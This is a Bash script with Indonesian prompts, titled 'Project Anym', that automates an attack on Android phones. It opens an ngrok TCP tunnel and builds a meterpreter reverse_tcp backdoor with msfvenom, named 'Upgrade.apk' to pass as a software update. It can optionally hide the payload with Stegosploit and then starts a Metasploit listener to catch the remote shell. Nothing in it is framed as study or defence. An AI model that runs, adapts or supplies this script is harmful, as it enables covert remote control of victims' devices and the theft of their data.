#!/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#///          __________                   __               __              ///
#///          \______   \_______  ____    |__| ____   _____/  |_            ///
#///          |     ___/\_  __ \/  _ \   |  |/ __ \_/ ___\   __\            ///
#///          |    |     |  | \(  <_> )  |  \  ___/\  \___|  |              /// 
#///          |____|     |__|   \____/\__|  |\___  >\___  >__|              ///
#                                    \______|    \/     \/      
#                        _____                        
#                       /  _  \   ____ ___.__. _____  
#                      /  /_\  \ /    <   |  |/     \ 
#                     /    |    \   |  \___  |  Y Y  \
#                     \____|__  /___|  / ____|__|_|  /
#                             \/     \/\/          \/ 
#////                                                                       ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////                                         
echo " ======================================="
echo " ==         Project Anym              =="
echo " ======================================="
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
clear
echo "Loading.."
load
clear
figlet Anym
echo "============================================"                                            
echo "==    Selamat datang di Anym Project   =="
echo "============================================"   
echo " Mulai Anym Project?"
echo "y/n?"
read start
if [ $start = "y" ]; then
    clear
    echo "Memulai..."
    echo "Loading.."
    load
    clear
    paladin
#anti trackback tcp
    echo
    echo "Starting Anti Trackback"
    sleep 3
    gnome-terminal -x bash -c "$HOME/Paladin_project/anti_track_back.sh; exec bash"
#trap project
    echo
    echo "Starting Trap Project"
    sleep 3
    gnome-terminal -x bash -c "$HOME/Paladin_project/trap.sh; exec bash"
#paladin auto exploit
    echo
    echo "Start Auto exploit?"
    echo "y/n?"
    read paladin_auto
    if [ $paladin_auto = "y" ]; then
        echo "Memulai auto exploit"
        gnome-terminal -x bash -c "$HOME/Paladin_project/ngrok tcp 4444; exec bash"
#ambil IP & Port Ngrok
        gnome-terminal -x ping "0.tcp.ngrok.io"        
        echo
        echo "Masukan IP Ngrok"
        read ip_ngrok
        echo
        echo "Masukan Port Ngrok"
        read port_ngrok
        echo "===================================="        
        echo "  Membuat Backdoor Menggunakan  "
        echo "  IP   :$ip_ngrok               "
        echo "  Port :$port_ngrok             "
        echo "===================================="
        echo
        sleep 3
        gnome-terminal -x msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip_ngrok LPORT=$port_ngrok -o Upgrade.apk
        sleep 5
        echo "Backdoor berhasil dibuat"        
        echo
        echo "Gunakan Stegosploit?"
        echo "y/n"
        read start_stegosploit
        if [ $start_stegosploit = "y" ]; then
            gnome-terminal -x bash -c "$HOME/Paladin_project/stegosploit.sh; exec bash"
            echo "Start Metasploit sekarang?"
            echo "y/n?"
            read start_metasploit
            if [ $start_metasploit = "y" ]; then
                clear
                echo "Loading.."
                load
                clear
                paladin
                echo "Memulai Metasploit"
                echo
#auto metasploit pakai ngrok WAN
                msfconsole -q -x "use exploit/multi/handler;
                set payload android/meterpreter/reverse_tcp;
                set lhost 0.0.0.0;
                set lport 4444;
                exploit"
            else
                echo "Kesalahan"
            fi
        else
            echo "Kesalahan"
        fi
    else
        echo "Kesalahan"
    fi
else
    echo "Terimakasih sudah menggunakan Anym Project"
fi
